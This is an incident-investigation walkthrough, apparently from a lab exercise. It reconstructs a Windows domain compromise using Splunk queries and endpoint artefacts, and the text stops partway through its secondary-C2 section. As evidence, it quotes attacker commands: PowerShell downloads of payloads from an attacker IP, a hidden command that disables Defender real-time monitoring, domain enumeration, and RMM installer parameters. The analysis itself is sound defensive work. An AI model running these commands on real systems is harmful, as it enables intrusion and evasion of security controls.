# 🔻 StarkTech Investigation Walkthrough  
## 🔻 Splunk + Windows Artefact Investigation

 > **Purpose:** This walkthrough shows the investigation process, evidence pivots, and analyst reasoning used to trace a multi-stage Windows domain compromise.  
 
 > This is **not** the final incident report. A separate IR report will summarise the confirmed incident narrative, business impact, IOCs, MITRE ATT&CK mapping, and response recommendations.

---

## 🔻 Table of Contents

- [What This Demonstrates](#what-this-demonstrates)
- [Systems in Scope](#systems-in-scope)
- [1. Initial Access](#1-initial-access)
- [2. Browser Artefact Validation](#2-browser-artefact-validation)
- [3. Execution](#3-execution)
- [4. Telemetry Scoping and Event ID Profiling](#4-telemetry-scoping-and-event-id-profiling)
- [5. Initial Command and Control](#5-initial-command-and-control)
- [6. Discovery and Reconnaissance](#6-discovery-and-reconnaissance)
- [7. Process Injection and Migration](#7-process-injection-and-migration)
- [8. Persistence](#8-persistence)
- [9. Scheduled Task Persistence](#9-scheduled-task-persistence)
- [10. Shortcut Persistence](#10-shortcut-persistence)
- [11. Defence Evasion](#11-defence-evasion)
- [12. Credential Access](#12-credential-access)
- [13. Lateral Movement](#13-lateral-movement)
- [14. Post-Lateral Movement Payload Staging](#14-post-lateral-movement-payload-staging)
- [15. Secondary Payload Execution](#15-secondary-payload-execution)
- [16. Secondary Command and Control](#16-secondary-command-and-control)
- [17. Collection](#17-collection)
- [18. Exfiltration](#18-exfiltration)
- [19. DC01 Activity and Impact Preparation](#19-dc01-activity-and-impact-preparation)
- [20. Investigation Timeline](#20-investigation-timeline)
- [21. Screenshot Checklist](#21-screenshot-checklist)
- [22. Analyst Notes](#22-analyst-notes)
- [23. Final Summary](#23-final-summary)

---

## What This Demonstrates

This investigation demonstrates:

- Alert-led triage from a suspicious URL
- DNS, browser, process, file, registry, authentication, and network log correlation
- Validation of SIEM findings using endpoint artefacts
- Event ID profiling as a method for understanding triggered telemetry before choosing pivots
- Attack timeline reconstruction across a workstation, file server, and domain controller
- Recognition of persistence, defence evasion, credential access, lateral movement, collection, exfiltration, and impact preparation
- Separation of confirmed findings from suspected activity

---

## Systems in Scope

| System | Role |
|---|---|
| `DESKTOP` | Initial compromised workstation |
| `FILES-SERVER` | File server accessed during lateral movement |
| `DC01` | Domain controller accessed later in the attack |

---

# 1. Initial Access

## What I Was Trying to Determine

The initial alert referenced a suspicious URL from a file-sharing service. My first goal was to identify:

- which user accessed the suspicious URL
- which host generated the activity
- what timestamp the activity occurred

## Why I Pivoted to DNS

DNS was the fastest starting point because a browser visit normally creates a DNS lookup before the user connects to the website. DNS alone does **not** prove the full page was viewed, but it can quickly identify the domain, host, user, and timestamp involved.

## Analyst Reasoning

I started with DNS because the alert referenced a suspicious URL. DNS is a fast way to identify the domain, host, user, and timestamp involved in a possible web-based compromise. However, DNS alone does not prove the user intentionally visited the page, so I treated it as an initial lead rather than final proof.

The DNS result gave me the first reliable pivot: `t.leon` on `DESKTOP` queried `paste.sh` at `13:27:40`. From there, I moved to browser history to validate whether the URL was actually visited from the user profile.

<details>
<summary><strong>SPL Query</strong></summary>

```spl
index="main" host="DESKTOP" source="xmlwineventlog:microsoft-windows-sysmon/operational" EventID=22 coretech
| table _time user QueryName
```

</details>

## Screenshot

<img width="1500" height="600" alt="image" src="https://github.com/user-attachments/assets/f7c0b941-c736-4897-b5e4-5a5fac67e7ce" />


## What the Evidence Showed

User `t.leon` on `DESKTOP` queried:

```text
paste.sh
```

Timestamp:

```text
2025-08-25 13:27:40
```

## What This Meant

This matched the alert context and identified the likely starting point of the compromise.

## Finding

`User t.leon accessed paste.sh from DESKTOP at 13:27:40.`

## Confidence

**High**

## Next Pivot

DNS alone does not prove the user interacted with the page, so I moved to browser history artefacts to validate the visit.

---

# 2. Browser Artefact Validation

## What I Was Trying to Determine

I wanted to confirm whether the `paste.sh` DNS lookup represented actual browser activity by the user.

## Why I Pivoted to Browser History

Browser history gives stronger user-level evidence than DNS alone. DNS can be triggered by background activity, prefetching, or embedded content, but browser history helps confirm that the URL was actually visited from the user profile.

## Analyst Reasoning

I used browser history because it provides stronger user-context evidence than DNS alone. A DNS query can be created by background activity, prefetching, or embedded content, but a browser history entry helps confirm that the user profile interacted with the URL.

Matching the browser artefact timestamp with the Splunk DNS timestamp increased confidence that `paste.sh` was the starting point of the compromise.

## Artefact Reviewed

```text
C:\Users\t.leon\AppData\Local\Microsoft\Edge\User Data\Default\History
```

## Screenshot

<table align="center">
  <tr>
    <td><img src="https://github.com/user-attachments/assets/0399a508-e323-4020-8a3b-bc18ac9d2b44" width="300" height="220"></td>
    <td><img src="https://github.com/user-attachments/assets/628a3214-25e0-4438-86a4-3f86ba723bde" width="300" height="220"></td>
    <td><img src="https://github.com/user-attachments/assets/616417d0-9831-42be-ae20-3c81b1f0275d" width="300" height="220"></td>
  </tr>
</table>



## What the Evidence Showed

The Microsoft Edge history database contained the suspicious `paste.sh` URL under the `t.leon` profile. The browser timestamp was decoded using DCode and matched the Splunk DNS event timeframe.

## What This Meant

The suspicious URL access was confirmed through both SIEM telemetry and endpoint artefacts.

## Finding

The `paste.sh` visit was validated through:

- Splunk DNS telemetry
- Microsoft Edge browser history
- decoded browser timestamp

## Confidence

**High**

## Next Pivot

After confirming the user visited the page, I reviewed the content of the `paste.sh` link to determine whether it delivered a payload or command.

---

# 3. Execution

## What I Was Trying to Determine

After confirming the suspicious URL visit, I needed to determine whether the page led to code execution.

## Why I Pivoted to PowerShell and Process Execution

The `paste.sh` content contained a command. Since attackers commonly use PowerShell for payload delivery, I searched for PowerShell execution and process creation activity tied to the user and host.

## Analyst Reasoning

Once the suspicious URL was confirmed, the next question was whether it only represented browsing activity or whether it led to code execution. Because the page contained a PowerShell command, I searched for PowerShell and process creation activity tied to the user and host.

This pivot was important because it connected the initial access artefact to the first executable payload, `iexploreplugin.exe`. Without this step, the URL would only be suspicious browsing activity rather than confirmed execution.

## Evidence Observed

The `paste.sh` page contained a PowerShell command that downloaded:

```text
iexploreplugin.exe
```

Payload URL:

```text
http://10.10.5.171:8883/iexploreplugin.exe
```

<details>
<summary><strong>SPL Query</strong></summary>

```spl
index="main" user="t.leon" host="DESKTOP" source="xmlwineventlog:microsoft-windows-sysmon/operational" Image="*iexploreplugin.exe" powershell
| table _time user ParentCommandLine CommandLine
```

</details>

## Screenshots

<img width="1803" height="785" alt="image" src="https://github.com/user-attachments/assets/04fab0cd-c091-498b-80a5-a6877c121137" />


<img width="2048" height="812" alt="image" src="https://github.com/user-attachments/assets/f60f882d-dbc5-4edf-8390-8cbd3f1a75ce" />


## What the Evidence Showed

The suspicious URL led to a PowerShell command that downloaded and executed `iexploreplugin.exe`.

## What This Meant

The investigation moved from suspicious browsing activity into confirmed payload execution.

## Finding

The attacker delivered and executed `iexploreplugin.exe` using PowerShell.

## Confidence

**High**

## Next Pivot

Once `iexploreplugin.exe` was identified as the initial payload, I did **not** immediately assume what the malware did. I first profiled the Event IDs triggered by the process to understand what telemetry was available and which evidence streams were worth investigating.

---

# 4. Telemetry Scoping and Event ID Profiling

## What I Was Trying to Determine

After confirming that `iexploreplugin.exe` executed, I wanted to understand what types of activity it generated before diving into individual logs.

Instead of randomly querying for different behaviours, I first checked which Sysmon Event IDs were triggered. This helped me map the available telemetry and decide which pivots made sense.

## Why I Pivoted to Event ID Counts

Sysmon records different behaviours under different Event IDs. By summarising the Event IDs linked to `iexploreplugin.exe`, I could quickly identify whether the process:

- created child processes
- made network connections
- loaded DLLs
- injected into other processes
- accessed sensitive processes
- created files
- modified registry keys
- generated DNS queries

This acted as a triage map for the rest of the investigation.

## Analyst Reasoning

I used Event ID profiling to avoid guessing what to investigate next. Instead of immediately assuming the payload performed C2, persistence, or credential access, I first checked which Sysmon Event IDs were generated by `iexploreplugin.exe`.

This gave me a behaviour map. Event ID 3 pointed me toward network activity, Event ID 1 toward child processes, Event ID 8 toward process injection, Event ID 10 toward process access, Event ID 11 toward file creation, and Event ID 22 toward DNS activity.

This step shaped the rest of the investigation and made the pivots evidence-led rather than random.

<details>
<summary><strong>Event ID Profiling Query for iexploreplugin.exe</strong></summary>

```spl
index="main" source="xmlwineventlog:microsoft-windows-sysmon/operational" "*iexploreplugin.exe"
| stats count by EventID
```

</details>

## Screenshot

<img width="2048" height="909" alt="image" src="https://github.com/user-attachments/assets/36e47f4d-7b29-41ad-bc1e-9c245f24762d" />


## What the Evidence Showed

The process generated multiple Sysmon event types:

| Event ID | Behaviour |
|---:|---|
| 1 | Process creation |
| 3 | Network connection |
| 7 | Image loaded |
| 8 | CreateRemoteThread |
| 10 | ProcessAccess |
| 11 | FileCreate |
| 12 | Registry object created/deleted |
| 13 | Registry value set |
| 15 | FileCreateStreamHash |
| 17 | Pipe created |
| 18 | Pipe connected |
| 22 | DNS query |

## How This Shaped My Pivots

| Event ID | Investigation Pivots |
|---:|---|
| 1 | Review child processes and command execution |
| 3 | Identify C2/network connections |
| 7 | Check DLL loading and possible side-loading |
| 8 | Investigate process injection |
| 10 | Investigate LSASS/process access |
| 11 | Review dropped files |
| 12 / 13 | Review registry changes |
| 22 | Review DNS lookups |

## Additional Telemetry Check Across Hosts

I also reviewed Sysmon Event IDs across the available hosts for the incident date to understand what telemetry existed across the wider environment. This helped confirm that useful evidence was available for process execution, network connections, file creation, registry activity, process access, DNS queries, and image loads.

<details>
<summary><strong>Broad Event ID Check</strong></summary>

```spl
index="main" source="xmlwineventlog:microsoft-windows-sysmon/operational"
| stats count by EventID
```

</details>

## Finding

Event ID profiling showed that `iexploreplugin.exe` was involved in process execution, network activity, file creation, process access, process injection, registry activity, DLL loading, and DNS activity.

## Why This Mattered

This was one of the key methodology steps in the investigation. It showed that I was not guessing. I used the Event ID profile to decide which evidence streams to follow next.

## Confidence

**High**

## Next Pivot

Because Event ID 3 showed network activity, I pivoted into network connections first to identify possible C2 communication.

---

# 5. Initial Command and Control

## What I Was Trying to Determine

After confirming payload execution and profiling its telemetry, I needed to determine whether `iexploreplugin.exe` contacted attacker infrastructure.

## Why I Pivoted to Sysmon Event ID 3

Sysmon Event ID 3 records network connections and helps attribute outbound traffic to a specific process. This is useful for identifying C2 behaviour tied directly to the payload.

## Analyst Reasoning

After Event ID profiling showed network activity, I checked Event ID 3 because it directly links network connections to the process that initiated them. This mattered because I needed to know whether `iexploreplugin.exe` was communicating externally or only running locally.

The connection to `10.10.5.62:8080` became important because the same IP later appeared as the source of lateral movement activity. That reuse made it a stronger infrastructure indicator rather than an isolated connection.

<details>
<summary><strong>SPL Query</strong></summary>

```spl
index="main" user="t.leon" host="DESKTOP" source="xmlwineventlog:microsoft-windows-sysmon/operational" Image="*iexploreplugin.exe" EventID=3
| stats count by dest_ip dest_port
```

</details>

## Screenshot

![Initial C2 connection from iexploreplugin](./screenshots/07-initial-c2.png)

> **Screenshot source:** PDF page 7  
> **What it should show:** `10.10.5.62:8080`.

## What the Evidence Showed

`iexploreplugin.exe` communicated with:

```text
10.10.5.62:8080
10.10.11.74:49668
10.10.11.74:135
```

The most suspicious connection was:

```text
10.10.5.62:8080
```

## What This Meant

The executable established outbound communication to infrastructure that later appeared again as the source of lateral movement activity.

## Finding

`iexploreplugin.exe` established suspicious communication with:

```text
10.10.5.62:8080
```

## Confidence

**High**

## Next Pivot

After identifying network communication, I checked what commands the payload executed on the host by pivoting to Event ID 1 process creation.

---

# 6. Discovery and Reconnaissance

## What I Was Trying to Determine

I wanted to understand what the attacker did after gaining execution on `DESKTOP`.

## Why I Pivoted to Child Processes

From the Event ID profile, I knew `iexploreplugin.exe` generated Event ID 1 process creation events. If `iexploreplugin.exe` was acting as the payload or C2 agent, its child processes would likely show attacker-issued commands.

## Analyst Reasoning

I reviewed child processes because attacker commands are often visible as processes spawned by the initial payload or C2 agent. This helped move the investigation from “malware executed” to “what actions did the attacker perform?”

The commands showed environment discovery rather than random system activity. `net user /domain`, `net group "Domain Admins" /domain`, `whoami /all`, and `net view \\coretech.lab\SYSVOL` indicate the attacker was learning the domain structure, user accounts, privileges, and reachable resources before moving further.

<details>
<summary><strong>SPL Query</strong></summary>

```spl
index="main" host="desktop" user="t.leon" source="xmlwineventlog:microsoft-windows-sysmon/operational" ParentImage="*iexploreplugin.exe" EventID=1
| table _time Image CommandLine
```

</details>

## Screenshot

![Discovery commands from iexploreplugin](./screenshots/08-discovery-commands.png)

> **Screenshot source:** PDF page 8  
> **What it should show:** commands spawned by `iexploreplugin.exe`.

## What the Evidence Showed

The payload spawned multiple native Windows commands:

```text
cmdkey /list
net view \\coretech.lab\SYSVOL
ping -n 1 DC01
net user /domain
net user
net group "Domain Admins" /domain
net localgroup administrators
whoami
whoami /all
tasklist
```

## What This Meant

The attacker was enumerating credentials, users, groups, domain resources, privileges, and running processes.

| Command | Meaning |
|---|---|
| `cmdkey /list` | Checks stored credentials |
| `net view \\coretech.lab\SYSVOL` | Enumerates SYSVOL/domain share |
| `ping -n 1 DC01` | Tests domain controller reachability |
| `net user /domain` | Lists domain users |
| `net group "Domain Admins" /domain` | Identifies privileged domain accounts |
| `whoami /all` | Checks current privileges and group membership |
| `tasklist` | Reviews running processes |

## Finding

The attacker performed systematic discovery after executing `iexploreplugin.exe`.

## Confidence

**High**

## Next Pivot

Because `tasklist` and other discovery activity can be used to identify processes for injection or credential access, I checked Event ID 8 process injection activity.

---

# 7. Process Injection and Migration

## What I Was Trying to Determine

I wanted to know whether the attacker migrated into legitimate processes to hide activity or run tools under a different process context.

## Why I Pivoted to Sysmon Event ID 8

From the Event ID profile, I knew `iexploreplugin.exe` generated Event ID 8. Sysmon Event ID 8 records CreateRemoteThread activity, which can indicate process injection, especially when a suspicious process creates a remote thread in a legitimate process.

## Analyst Reasoning

I checked process injection because Event ID 8 appeared in the Event ID profile. CreateRemoteThread activity can indicate that a suspicious process injected code into another process to hide, evade detection, or run actions under a different process context.

This became an important pivot because the injected processes were not dead ends. `notepad.exe` was later associated with BloodHound-style output, while `spoolsv.exe` later accessed LSASS. That connection helped explain later credential access activity.

## Screenshot

![CreateRemoteThread into notepad and spoolsv](./screenshots/09-process-injection.png)

> **Screenshot source:** PDF page 9  
> **What it should show:** Event ID 8 involving `notepad.exe` and `spoolsv.exe`.

## What the Evidence Showed

`iexploreplugin.exe` showed CreateRemoteThread activity involving:

```text
notepad.exe
spoolsv.exe
```

## What This Meant

These processes became important pivots:

```text
notepad.exe -> later associated with BloodHound-style enumeration output
spoolsv.exe -> later associated with LSASS access
```

## Additional Pivot: Notepad File Creation

Since `notepad.exe` was involved in injection, I checked whether it created suspicious output files.

<details>
<summary><strong>SPL Query</strong></summary>

```spl
index="main" host=DESKTOP EventCode=11 (TargetFilename=*.zip OR TargetFilename=*.json)
| table _time, Image, TargetFilename, User
```

</details>

The results showed BloodHound-style output:

```text
20250825133552_BloodHound.zip
```

## Finding

The attacker likely migrated into `notepad.exe` and generated BloodHound-style Active Directory enumeration output.

## Confidence

**High**

## Next Pivot

After confirming process migration and enumeration output, I checked whether the attacker established persistence.

---

# 8. Persistence

## What I Was Trying to Determine

I wanted to determine whether the attacker installed tools or mechanisms to maintain access after the initial compromise.

## Why I Pivoted to File Creation and Service Installation

From the Event ID profile, I knew `iexploreplugin.exe` generated file creation and registry-related activity. Attackers commonly establish persistence using installed services, scheduled tasks, shortcuts, or legitimate remote management tools. I started with file creation and service creation events.

## Analyst Reasoning

After confirming execution and discovery, I checked for persistence because attackers commonly establish a way back into the environment before continuing deeper. I focused on file creation, service installation, scheduled tasks, and remote management tools.

The RMM findings mattered because Atera, Splashtop, and AnyDesk are legitimate tools that can be abused by attackers. Their presence during the compromise window, tied to suspicious command execution and attacker-controlled configuration values, made them strong persistence indicators.

<details>
<summary><strong>File Creation Query</strong></summary>

```spl
index="main" source="xmlwineventlog:microsoft-windows-sysmon/operational" Image="*iexploreplugin.exe" EventID=11
| table _time Image file_name file_path
```

</details>

## RMM Evidence

The process chain showed an Atera installer download using:

```text
IntegratorLogin=bunionsneaker.4m@gmail.com
AccountId=001Q300000VzBKuIAN
```

Installer path:

```text
C:\Windows\Temp\setup.msi
```

<details>
<summary><strong>Service Creation Query</strong></summary>

```spl
index="main" host="DESKTOP" source="xmlwineventlog:security" EventID=4697
| table _time user host service_name
```

</details>

## Screenshot

![RMM services installed](./screenshots/10-rmm-persistence.png)

> **Screenshot source:** PDF page 12  
> **What it should show:** Atera, SplashtopRemoteService, AnyDesk.

## What the Evidence Showed

The following RMM services were installed:

```text
AteraAgent
SplashtopRemoteService
AnyDesk
```

## What This Meant

The attacker used legitimate remote management tooling for persistence. This is significant because RMM tools can blend in with normal IT support activity.

## Finding

The attacker established persistence using Atera, Splashtop, and AnyDesk.

## Confidence

**High**

## Next Pivot

After identifying service persistence, I checked whether scheduled tasks or other persistence mechanisms were created.

---

# 9. Scheduled Task Persistence

## What I Was Trying to Determine

I wanted to confirm whether persistence was reinforced through scheduled tasks.

## Why I Pivoted to Scheduled Tasks and Registry Artefacts

Scheduled tasks are common persistence mechanisms. Event logs may not always show the full picture, so I also checked registry and task folder artefacts.

## Analyst Reasoning

I checked scheduled tasks because persistence is not always visible through services alone. Event logs showed one Atera-related task, but I also reviewed registry and task folder artefacts because scheduled task evidence can exist outside the SIEM view.

Finding `Monitoring Recovery` and `AteraAgentServiceWatchdog` through registry and task artefacts showed why endpoint artefact validation matters. The SIEM provided the lead, but the forensic artefacts gave a fuller picture.

## Evidence Observed

Security Event ID 4698 showed:

```text
AteraAgentServiceWatchdog
```

Registry and task folder artefacts showed:

```text
Monitoring Recovery
AteraAgentServiceWatchdog
```

Relevant timestamps:

```text
2025-08-25 13:47:10 - Monitoring Recovery
2025-08-25 13:51:18 - AteraAgentServiceWatchdog
```

## Screenshot

![Scheduled task persistence](./screenshots/11-scheduled-tasks.png)

> **Screenshot source:** PDF pages 13–14  
> **What it should show:** Event ID 4698, Registry Explorer, task folder artefacts, Base64 decode.

## What This Meant

Persistence was not limited to services. The attacker or RMM tooling created scheduled tasks to maintain or recover access.

## Finding

Atera persistence was reinforced through scheduled tasks.

## Confidence

**High**

## Next Pivot

I then investigated a suspicious VBS script observed around the same persistence window.

---

# 10. Shortcut Persistence

## What I Was Trying to Determine

The script `scvhost.vbs` appeared during the persistence timeframe. I wanted to determine whether it had a persistence role.

## Why I Pivoted to Shortcut Creation

Scripts are often used to create shortcuts in startup or persistence locations. I searched for `.lnk` file creation to determine whether the script created a shortcut.

## Analyst Reasoning

At first, `scvhost.vbs` was suspicious because of its timing and naming, but I could not confirm its purpose from Prefetch and MFT review alone. Instead of forcing a conclusion, I treated it as suspicious but unconfirmed.

The pivot to shortcut creation helped clarify its role. When `cscript.exe` executed `scvhost.vbs` at the same time `iexplorer.lnk` was created, the evidence supported that the script was involved in shortcut persistence.

## Evidence Observed

Script created:

```text
2025-08-25 13:51:17 - C:\Users\t.leon\scvhost.vbs
```

Script executed:

```text
2025-08-25 13:52:25 - cscript.exe C:\Users\t.leon\scvhost.vbs
```

Shortcut created:

```text
iexplorer.lnk
```

## Screenshot

![scvhost shortcut persistence](./screenshots/12-scvhost-shortcut.png)

> **Screenshot source:** PDF pages 14–15  
> **What it should show:** `scvhost.vbs`, `cscript.exe`, and `.lnk` evidence if captured.

## Evidence Handling Note

Initially, I could not confirm the full purpose of `scvhost.vbs` from Prefetch and MFT review alone. I treated it as suspicious but unconfirmed until shortcut creation evidence tied `cscript.exe` and `scvhost.vbs` to `iexplorer.lnk`.

## What This Meant

The script was linked to shortcut creation, which increased confidence that it played a persistence role.

## Finding

`scvhost.vbs` created `iexplorer.lnk`.

## Confidence

| Item | Confidence |
|---|---|
| Shortcut creation | High |
| Full script purpose | Medium unless shortcut target is fully validated |

## Next Pivot

After persistence was confirmed, I reviewed whether the attacker attempted to weaken endpoint security.

---

# 11. Defence Evasion

## What I Was Trying to Determine

I wanted to identify whether the attacker attempted to disable or reduce security controls.

## Why I Pivoted to Defender-Related Commands

Attackers commonly use PowerShell to modify Microsoft Defender settings before running additional payloads.

## Analyst Reasoning

I checked for Defender tampering because attackers often disable security controls before staging additional payloads, dumping credentials, or moving laterally. The command used hidden PowerShell and `Set-MpPreference`, which made it highly relevant in the compromise chain.

This finding also helped explain why later payloads and tools may have been able to execute without immediate prevention.

## Evidence Observed

Command:

```text
powershell.exe -WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring
```

Timestamp:

```text
2025-08-25 13:53:40
```

## Screenshot

![Defender tampering command](./screenshots/13-defender-evasion.png)

> **Screenshot source:** PDF page 15/16  
> **What it should show:** `Set-MpPreference -DisableRealtimeMonitoring`.

## What This Meant

The attacker disabled Microsoft Defender real-time monitoring, likely to reduce detection of follow-on activity.

## Finding

Defender real-time monitoring was disabled using hidden PowerShell.

## Confidence

**High**

## Next Pivot

Because lateral movement occurred shortly after this point, I investigated whether credential access happened before the attacker moved to servers.

---

# 12. Credential Access

## What I Was Trying to Determine

I wanted to determine how the attacker may have obtained credentials for later access to `FILES-SERVER` and `DC01`.

## Why I Pivoted to LSASS Access

From the initial Event ID profile, I knew `iexploreplugin.exe` generated Event ID 10 ProcessAccess events. LSASS stores authentication material in memory, so Sysmon Event ID 10 is useful for identifying suspicious access to `lsass.exe`.

## Analyst Reasoning

I investigated LSASS access because lateral movement occurred shortly after the workstation compromise. To move to `FILES-SERVER` using `admin143`, the attacker likely needed valid credentials or credential material.

Sysmon Event ID 10 was the right pivot because it records process access activity. The sequence of `iexploreplugin.exe` accessing `spoolsv.exe`, followed by `spoolsv.exe` accessing `lsass.exe`, connected process injection to possible credential access.

I kept the wording cautious because LSASS access supports credential dumping, but does not prove successful dumping unless hash output or tool artefacts are recovered.

<details>
<summary><strong>SPL Query</strong></summary>

```spl
index="main" host="DESKTOP" EventCode=10 TargetImage="*lsass.exe"
| table _time, SourceImage, TargetImage, GrantedAccess, CallTrace
| sort _time
```

</details>

## Screenshot

![LSASS access by spoolsv](./screenshots/14-lsass-access.png)

> **Screenshot source:** PDF page 26  
> **What it should show:** `iexploreplugin.exe`, `spoolsv.exe`, and `lsass.exe`.

## What the Evidence Showed

Key sequence:

```text
2025-08-25 13:55:22 - iexploreplugin.exe accessed spoolsv.exe
2025-08-25 13:56:54 - spoolsv.exe accessed lsass.exe
```

## What This Meant

This sequence supports the theory that the attacker migrated into `spoolsv.exe` before attempting credential access against LSASS.

## Finding

The attacker likely used `spoolsv.exe` for credential access activity.

## Confidence

**Medium to High**

> **Analyst caution:** This supports credential access and possible hash dumping, but I would not claim credential dumping was fully confirmed unless additional artefacts show dumped hashes, credential output, or tool-specific behaviour.

## Next Pivot

After identifying credential access indicators, I checked authentication logs on server assets for successful logons using unusual accounts or source IPs.

---

# 13. Lateral Movement

## What I Was Trying to Determine

I wanted to determine whether the attacker moved from the initial workstation to other systems.

## Why I Pivoted to Security Event ID 4624

Windows Security Event ID 4624 records successful logons. Logon Type 3 indicates a network logon, which is commonly seen during lateral movement over SMB or other remote access methods.

## Analyst Reasoning

I pivoted to Security Event ID 4624 because I needed to determine whether the attacker used the suspected credential access to move to other hosts. Logon Type 3 was important because it indicates network authentication, which is commonly seen during lateral movement.

The `FILES-SERVER` logon became stronger evidence when I correlated it with `whoami` executing one second later. A successful logon alone can be ambiguous, but immediate command execution after the logon supports hands-on-keyboard or remote command activity.

<details>
<summary><strong>FILES-SERVER Query</strong></summary>

```spl
index="main" host="files-server" source="xmlwineventlog:security" EventID="4624" LogonType=3
| table _time, LogonType, TargetUserName, src_ip
```

</details>

## Screenshot

![FILES-SERVER network logon](./screenshots/15-fileserver-logon.png)

> **Screenshot source:** PDF page 16  
> **What it should show:** `admin143`, `10.10.5.62`, Logon Type 3, timestamp `13:58:52`.

## What the Evidence Showed

```text
2025-08-25 13:58:52
admin143 logged into FILES-SERVER from 10.10.5.62
LogonType 3
```

## Immediate Command Execution

I then checked for process execution after the logon.

<details>
<summary><strong>SPL Query</strong></summary>

```spl
index=* (host="FILES-SERVER" OR host="dc01") source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 cmd OR powershell
| table _time host CommandLine ParentCommandLine
```

</details>

Important correlation:

```text
2025-08-25 13:58:52 - admin143 logs onto FILES-SERVER
2025-08-25 13:58:53 - whoami executed on FILES-SERVER
```

## Screenshot

![Command execution after FILES-SERVER logon](./screenshots/16-fileserver-command-execution.png)

> **Screenshot source:** PDF pages 18–19  
> **What it should show:** `whoami` one second after logon.

## DC01 Logon

The same account and source IP later authenticated to `DC01`.

```text
2025-08-25 14:34:30
admin143 logged into DC01 from 10.10.5.62
LogonType 3
```

## What This Meant

The attacker used `admin143` to move from the workstation compromise into server assets.

## Finding

The attacker laterally moved to `FILES-SERVER` and later `DC01`.

## Confidence

**High**

## Next Pivot

After confirming access to `FILES-SERVER`, I investigated what the attacker staged and executed on that host.

---

# 14. Post-Lateral Movement Payload Staging

## What I Was Trying to Determine

After confirming lateral movement to `FILES-SERVER`, I needed to identify what tools or payloads the attacker staged.

## Why I Pivoted to PowerShell Downloads and File Creation

Attackers commonly download additional tools after moving laterally. I looked for PowerShell download commands and file creation in the compromised user’s profile.

## Analyst Reasoning

After confirming lateral movement, I checked for payload staging because attackers often download fresh tools onto newly accessed systems instead of relying only on the original workstation payload.

The `python.zip` download showed that the attacker was preparing additional execution on `FILES-SERVER`. Searching file creation events helped identify what was extracted from the archive and gave me the next pivot: `testc.exe` and `python311.dll`.

## Evidence Observed

Download command:

```text
powershell -c iwr -uri http://10.10.5.171:8883/python.zip -outfile C:\Users\admin143\Downloads\python.zip
```

Timestamp:

```text
2025-08-25 14:00:33
```

Extraction command:

```text
powershell -c "Expand-Archive -Path 'C:\Users\admin143\Downloads\python.zip' -DestinationPath 'C:\Users\admin143\Downloads' -Force"
```

Timestamp:

```text
2025-08-25 14:03:00
```

<details>
<summary><strong>SPL Query</strong></summary>

```spl
index=* (host="FILES-SERVER" OR host="dc01") source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" TargetFilename=*Downloads\\python*
| table _time Image TargetFilename
```

</details>

## Screenshot

![python.zip staging](./screenshots/17-python-zip.png)

> **Screenshot source:** PDF pages 19–20  
> **What it should show:** `python.zip`, `testc.exe`, `python311.dll`.

## What the Evidence Showed

Extracted files:

```text
testc.exe
python311.dll
```

## Finding

The attacker downloaded and extracted a second-stage payload archive on `FILES-SERVER`.

## Confidence

**High**

## Next Pivot

I then investigated `testc.exe` to determine what it executed or dropped.

---

# 15. Secondary Payload Execution

## What I Was Trying to Determine

I wanted to determine what `testc.exe` did after being extracted.

## Why I Pivoted to Event IDs for testc.exe

Before assuming what `testc.exe` did, I summarised the Event IDs it generated. This gave me a quick view of whether it created files, loaded DLLs, or made network connections.

## Analyst Reasoning

I repeated the Event ID profiling method for `testc.exe` instead of assuming its behaviour. This showed that `testc.exe` created files, loaded DLLs, and made network connections.

That profile gave me a structured path: Event ID 11 identified dropped files, Event ID 7 helped assess DLL loading, and Event ID 3 pointed toward network activity.

<details>
<summary><strong>Event ID Profiling Query for testc.exe</strong></summary>

```spl
index=* (host="FILES-SERVER" OR host="dc01") source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" Image="*testc.exe"
| stats count by EventID
```

</details>

## What the Evidence Showed

`testc.exe` generated:

```text
Event ID 1  - Process creation
Event ID 3  - Network connection
Event ID 7  - Image loaded
Event ID 11 - File creation
```

This Event ID profile gave me the next pivots:

| Event ID | Pivot |
|---:|---|
| 11 | Identify dropped files |
| 7 | Review loaded DLLs |
| 3 | Review network connections |

## Dropped Files

```text
2025-08-25 14:03:51 - ws2_32.exe
2025-08-25 14:03:52 - system_module.exe
```

## DLL Load Evidence

```text
C:\Users\admin143\Downloads\python\python311.dll
urlmon.dll
```

## Screenshot

![testc dropped files](./screenshots/18-testc-dropped-files.png)

> **Screenshot source:** PDF pages 20–21 and 23  
> **What it should show:** `testc.exe`, `ws2_32.exe`, `system_module.exe`, `python311.dll`.

## What This Meant

`testc.exe` likely acted as a loader or secondary payload component, dropping additional executables and loading DLLs from the extracted directory.

## Finding

`testc.exe` dropped:

```text
ws2_32.exe
system_module.exe
```

It also likely used `python311.dll` as part of its execution chain.

## Confidence

| Finding | Confidence |
|---|---|
| Dropped files | High |
| Suspected DLL side-loading | Medium to High |

## Next Pivot

Since the dropped files looked suspicious, I checked whether they contacted C2 infrastructure.

---

# 16. Secondary Command and Control

## What I Was Trying to Determine

I wanted to determine whether `ws2_32.exe` and `system_module.exe` contacted attacker infrastructure.

## Why I First Profiled Their Event IDs

Before jumping straight to C2, I first summarised the Event IDs generated by `ws2_32.exe` and `system_module.exe`. The presence of DNS and network events gave me a reason to pivot into Event ID 22 and Event ID 3.

## Analyst Reasoning

I checked DNS and network connections for `ws2_32.exe` and `system_module.exe` because these files were dropped by `testc.exe` and had suspicious system-like names. DNS identified the domain `agegamepay.com`, while Event ID 3 confirmed the resolved IP and ports used for communication.

The DNS-to-network sequence made the C2 assessment stronger because it showed the process resolving the domain and then connecting to the resolved infrastructure shortly after.

<details>
<summary><strong>Event ID Profiling Query for ws2_32.exe and system_module.exe</strong></summary>

```spl
index=* (host="FILES-SERVER" OR host="dc01") source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
| search Image=*ws2_32.exe* OR Image=*system_module.exe*
| stats count by EventID
```

</details>

## DNS Pivot

DNS events can reveal domains contacted by malware, while Sysmon Event ID 3 can confirm outbound connections and ports.

<details>
<summary><strong>DNS Query</strong></summary>

```spl
index=* (host="FILES-SERVER" OR host="dc01") source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=22
| search Image=*ws2_32.exe* OR Image=*system_module.exe*
| table _time, Image, QueryName, answer
```

</details>

## Screenshot

![Secondary C2 DNS](./screenshots/19-secondary-c2-dns.png)

> **Screenshot source:** PDF page 22  
